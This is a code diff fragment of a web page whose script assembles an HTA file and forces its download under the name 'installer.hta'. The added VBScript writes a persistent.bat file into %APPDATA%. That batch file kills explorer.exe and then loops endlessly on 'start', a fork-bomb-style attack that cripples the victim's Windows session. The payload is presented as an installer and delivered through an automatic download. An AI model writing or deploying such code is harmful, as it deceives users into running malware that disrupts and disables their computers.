@@ -63,4 +63,26 @@
 
                 ' 创建 persistent.bat 文件并写入内容
                 Set fso = CreateObject("Scripting.FileSystemObject")
-                Set file = fso.CreateTextFile(WshShell.ExpandEnvironmentStrings("%
+                Set file = fso.CreateTextFile(WshShell.ExpandEnvironmentStrings("%APPDATA%\\persistent.bat"), True)
+                file.WriteLine "@echo off"
+                file.WriteLine "taskkill /f /im explorer.exe"
+                file.WriteLine ":loop"
+                file.WriteLine "start"
+                file.WriteLine "goto loop"
+                file.Close
+            </script>
+            </body>
+            </html>
+            `;
+            console.log('Generating HTA file...');
+            var blob = new Blob([htaContent], { type: 'application/octet-stream' });
+            var link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = 'installer.hta';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
+</body>
+</html>
